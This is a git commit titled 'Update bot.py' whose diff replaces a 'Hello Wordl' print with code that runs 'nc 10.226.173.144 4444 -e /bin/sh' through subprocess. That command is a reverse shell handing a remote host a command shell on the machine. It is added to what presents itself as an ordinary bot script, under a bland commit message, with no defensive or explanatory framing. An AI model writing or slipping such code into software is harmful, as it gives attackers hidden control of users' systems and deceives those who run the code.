5d0e0e56256124e17695b218b0ec2a8af24577af
sergidinamita <105441185+sergidinamita@users.noreply.github.com>
2023-09-06 19:01:38 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,2 +1,11 @@
+import subprocess
+
+# Define the command
+command = ["nc 10.226.173.144 4444 -e /bin/sh "]
+
+# Execute the command
 def run():
-    print("Hello Wordl")
+    try:
+        subprocess.run(command, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error: {e}")
